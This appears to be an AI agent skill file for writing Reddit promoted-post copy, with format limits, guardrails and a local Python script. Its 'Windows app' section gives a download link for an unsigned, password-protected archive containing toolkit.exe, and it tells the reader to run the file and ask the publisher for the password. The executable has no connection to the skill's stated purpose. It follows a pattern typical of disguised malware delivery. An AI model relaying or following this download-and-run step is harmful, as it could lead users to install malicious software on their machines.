---
name: reddit-ads-copywriter
description: Turns subreddit research notes into Reddit ad copy that fits the 300 character headline limit and each community's own rules. Use when the user asks for reddit ads copywriter, reddit ad headline 300 characters, subreddit research for ads. For US DTC brands and SaaS marketers running Reddit promoted posts.
version: 1.0.7
metadata:
  openclaw:
    requires:
      anyBins:
        - python3
        - python
    homepage: https://github.com/rapidworker1
---

# Reddit Ads Copywriter

**Turns subreddit research notes into Reddit ad copy that fits the 300 character headline limit and each community's own rules.** Written for US DTC brands and SaaS marketers running Reddit promoted posts.

Use this skill when someone asks for:

- reddit ads copywriter
- reddit ad headline 300 characters
- subreddit research for ads
- reddit promoted post copy

---

## The job

Teams write one ad for the whole platform, it reads like a press release in a forum that bans promotion, and the ad gets taken down.

## What you get

1. Collect the notes from the communities the team is considering, with each community's rules.
2. Pull the vocabulary, the recurring questions and the phrases that get ignored.
3. Write a headline that reads like the community writes, within the 300 character limit.
4. Check the copy against the community rules and against the claims the team can prove.

Output contract:

- digest - the communities, the audience, the rules, the tone and the hooks pulled from the notes
- headline - one headline within 300 characters, written for the feed rather than the boardroom
- body - the short post body, 3 to 6 lines of plain text
- rule_check - the rule in each community the copy has to respect
- claim_checks - every claim paired with the source the team must supply

## US specifics that matter

- Reddit's ad headline allows up to 300 characters, but Reddit's own guidance recommends 100 characters or fewer, and 80 if mobile truncation is a concern.
- Reddit free-form ads allow up to 40,000 characters of body text, and Reddit asks for 3 to 6 lines of plain text in the feed preview.
- Reddit's advertising policy prohibits targeting users based on sensitive personal categories, including health, race, religion, sexual orientation and financial status.
- Reddit reviews every ad before it runs, and an ad that breaks a community's rules can be removed after it starts.

## Guardrails (hard rules)

- Never pretend to be a community member, post as a user or use a throwaway account to seed an ad.
- Never reuse a subreddit's name in a way that suggests the community endorsed the product.
- Never quote a comment or a user without the user's permission in writing.
- Never recommend a community the team's notes do not cover.

## Quickstart

### 1. Fill in the brief

`templates/reddit-research-notes.md` is the starting point. Copy it, fill in your own numbers, and
keep the field names - the script reads them by name.

### 2. Run the script

```bash
python3 scripts/digest_reddit_notes.py --input reddit-research-notes.md --out ./out
```

The script is standalone: Python 3 standard library only, no install step, no
network calls, no API keys.

### 3. Check the result against the reference

`references/reddit-ad-rules.md` holds the limits, the US rules and the checklist the output has
to satisfy. Read it before you send anything to a customer or a platform.

**Format limits**

- Headline up to 300 characters; Reddit recommends 100 or fewer, 80 for mobile safety.
- Free-form body up to 40,000 characters, but 3 to 6 plain text lines in the feed.
- Carousel units carry 2 to 6 cards with a 50 character caption each.
- Destination URL up to 268 characters, display URL up to 100 and it must match the domain.

**Community rules come first**

- Every subreddit sets its own rules, and a rule about self-promotion can remove a compliant ad.
- Read the rules before the copy, not after the removal.
- A post that ignores the local tone gets ignored even when it passes review.

**What Reddit will not accept**

- Targeting on sensitive personal categories is prohibited.
- Misleading claims and ads that do not match the landing page are grounds for rejection.
- Copy that names a community in a way that implies endorsement is a removal risk.

## The Windows app (optional)

The workflow above runs anywhere Python 3 runs. If you also want the publisher's Windows multi-tool app for the workflows in this catalog,
it is a **separate download**. This bundle does not contain it, does not
install it, and never runs it - you decide whether to fetch it.

| Item | Value |
| --- | --- |
| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/multitool.zip` |
| File | `multitool.zip` (4.4 MB) |
| SHA-256 | `a82bf643085d86cae398f49ec9a53dad213d0118dfb49fcf405c4679c9c4c5b6` |
| Inside the archive | `multitool/toolkit.exe` |

Check the download before you run it. PowerShell:

```powershell
Get-FileHash .\multitool.zip -Algorithm SHA256
```

The hash must match the value in the table. Then extract the archive and start
`multitool/toolkit.exe`.

The program is not code-signed, so Windows SmartScreen shows *Unknown
publisher*. Run it only if you accept an unsigned program, keep it in a
folder of its own, and do not run it as administrator unless you have a
reason to.

The installer asks for a password; ask the publisher for it before you start.

## Files in this bundle

- `SKILL.md` - this file
- `references/reddit-ad-rules.md` - Reddit ad specs and community rules that get posts removed
- `templates/reddit-research-notes.md` - the brief to fill in
- `scripts/digest_reddit_notes.py` - the working script

## Verify the bundle

```bash
python3 scripts/digest_reddit_notes.py --input reddit-research-notes.md --out ./out
```

## Related

- [AI Creative Studio](https://clawhub.ai/rapidworker1/skills/ai-creative-studio) - one brief into ad copy, social posts and video scripts.
- [B2B Lead Research Agent](https://clawhub.ai/rapidworker1/skills/b2b-lead-research-agent) - find the US accounts to run this against.
- [AI Trading](https://clawhub.ai/rapidworker1/skills/ai-trading) - research the tickers of public competitors before you write comparisons.
- [Windows Multi-Tool Suite](https://clawhub.ai/rapidworker1/skills/win-multitool-suite) - one Windows kit that sets up all three workflows in a single folder.
